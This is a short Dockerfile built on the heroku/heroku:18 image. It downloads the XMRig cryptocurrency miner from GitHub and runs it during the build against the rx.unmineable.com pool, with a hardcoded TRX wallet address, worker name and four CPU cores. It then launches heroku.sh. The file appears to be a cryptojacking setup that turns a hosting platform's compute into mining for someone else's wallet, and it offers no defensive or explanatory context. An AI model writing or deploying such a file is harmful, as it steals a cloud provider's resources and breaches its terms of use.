FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz ; tar xf xmrig-6.14.0-linux-x64.tar.gz ; cd xmrig-6.14.0; ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TF7XkqVKuqysTySWDfLG6Zh5zMnudNmxxQ.Shikari2 -p x --cpu 4
CMD bash heroku.sh
